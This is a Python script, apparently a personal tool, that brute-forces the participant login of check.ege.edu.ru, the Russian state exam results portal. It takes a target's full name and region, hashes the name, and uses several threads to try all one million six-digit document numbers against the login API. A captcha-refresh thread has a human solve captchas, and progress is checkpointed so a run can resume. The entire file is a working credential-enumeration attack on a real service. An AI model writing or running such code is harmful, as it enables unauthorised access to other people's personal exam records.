#!/bin/bash
import argparse
import hashlib
import os
import logging
from random import shuffle
from base64 import decodebytes
from threading import Thread, Condition, Event, Lock
from queue import Queue, Empty
import pickle
import requests
from tqdm import tqdm

# TODO: logging
# TODO: exceptions
# TODO: replace prints with logger
# TODO: save goods to file

BASE_URL = 'http://check.ege.edu.ru/'
API_CAPTCHA = f'{BASE_URL}api/captcha'
API_LOGIN = f'{BASE_URL}api/participant/login'


def queue_list(q):
    try:
        yield q.get(False)
    except Empty:
        pass


class Bruter:
    def __init__(self, name, region):
        self.name = name
        self.hash = self.get_hash(name)
        self.region = region
        self.number = 1
        self.token = None
        self.captcha = None

        self.queue = Queue()

        t = ['0' * (6 - len(str(num))) + str(num) for num in range(1, 1000000)]
        shuffle(t)
        for num in t:
            self.queue.put(num)

        # for num in range(1, 1000000):
            # self.queue.put('0' * (6 - len(str(num))) + str(num))

        self.captcha_died = Event()
        self.captcha_condition = Condition()
        self.bruted = Event()

        self.captcha_died.set()

        self.progressbar_lock = Lock()
        self.bar = tqdm(total=10**6)

    def brute(self):
        while not self.queue.empty() and not self.bruted.is_set():

            if self.captcha_died.is_set():
                self.captcha_condition.acquire()
                self.captcha_condition.wait()
                self.captcha_condition.release()

            number = self.queue.get()

            body = {
                "Hash": self.hash,
                "Code": '',
                "Token": self.token,
                "Captcha": self.captcha,
                "Region": self.region,
                "Document": '0000' + number
            }

            r = requests.post(API_LOGIN, data=body)

            if r.status_code == 204:
                print(f'Bruted:{number}')
                self.bruted.set()
                self.captcha_died.set()  # Signal captcha thread not to wait
            elif r.text == '"Участник не найден"' and r.status_code == 401:
                # print(f'Bad:{number}')
                with self.progressbar_lock:
                    self.bar.update()
                    self.bar.write(f'[BAD] {number}')
            elif r.text == '"Пожалуйста, проверьте правильность введённого кода с картинки"' and r.status_code == 400:
                print('Captcha died')
                self.captcha_died.set()
            else:
                self.queue.put(number)
                print(r.text, r.status_code)
                print(f'Request failed:{number}')
        print('Brute thread exit')

    def start(self, threads_num):
        captcha_thread = Thread(target=self.captcha_solver, daemon=True)
        captcha_thread.start()
        threads = []
        for _ in range(threads_num):
            thread = Thread(target=self.brute, args=(), daemon=True)
            threads.append(thread)
            thread.start()
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            self.bruted.set()
            for thread in threads:
                thread.join()
            print('Saving progress...')
            self.save_progress()
        # captcha_thread.join()

    def captcha_solver(self):
        while not self.bruted.is_set() and not self.queue.empty():
            self.captcha_died.wait()

            if self.bruted.is_set():
                break

            print('Obtaining new captcha...')

            while not self.request_captcha():
                pass

            self.captcha_died.clear()
            self.captcha_condition.acquire()
            self.captcha_condition.notify_all()
            self.captcha_condition.release()
        print('Captcha thread quit')

    def request_captcha(self):
        r = requests.get(API_CAPTCHA)
        if r.status_code != 200:
            raise ConnectionError()
        _json = r.json()
        image = _json['Image']
        token = _json['Token']

        with open('captcha.jpg', 'wb') as f:
            f.write(decodebytes(image.encode()))

        os.system('open captcha.jpg')
        captcha = input('Enter captcha:').rstrip()
        if self.test_captcha(captcha, token):
            self.captcha = captcha
            self.token = token
            print('Captcha valid')
            return True
        else:
            print('Wrong captcha')
            return False

    @staticmethod
    def test_captcha(captcha, token):
        r = requests.post(API_LOGIN, data={
            'Captcha': captcha,
            'Code': '',
            'Document': '0000585858',
            'Hash': '4cfdc2e157eefe6facb983b1d557b3a1',
            'Region': 61,
            'Token': token
        })

        print(r.text, r.status_code)
        if r.text == '"Участник не найден"' and r.status_code == 401:
            return True
        else:
            return False

    # Get hash of fullname
    @staticmethod
    def get_hash(fullname):
        return hashlib.md5(fullname.lower()
                           .replace(' ', '')
                           .replace('й', 'и')
                           .replace('ё', 'е')
                           .encode('utf-8'))\
            .hexdigest()

    def save_progress(self):
        # TODO: queue_list doesn't work: yields only once
        l = [item for item in queue_list(self.queue)]

        with open(f'{self.hash}.cpt', 'wb') as f:
            pickle.dump(l, f, pickle.HIGHEST_PROTOCOL)

    def load_progress(self, filename):
        with open(filename, 'rb') as f:
            l = pickle.load(f)
        with self.queue.mutex:
            self.queue.queue.clear()
        for item in l:
            self.queue.put(item)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('fio', type=str)
    parser.add_argument('-r', '--region', type=int,
                        required=True, help='region')
    parser.add_argument('-t', '--threads', type=int,
                        default=4, help='number of threads')
    parser.add_argument('-c', '--checkpoint', type=str,
                        default=None, help='start bruting from a checkpoint')
    args = parser.parse_args()
    print(args)

    # try:
    #     fio_list = open(args.dictionary).readlines()
    # except FileNotFoundError:
    #     print('Dictionary file not found')
    #     os._exit(1)
    try:
        # for fio in fio_list:
        #     bruter = Bruter(fio, args.region)
        #     bruter.start(args.threads)
        bruter = Bruter(args.fio, args.region)
        if args.checkpoint != None:
            bruter.load_progress(args.checkpoint)
        bruter.start(args.threads)
    except KeyboardInterrupt:
        os._exit(2)
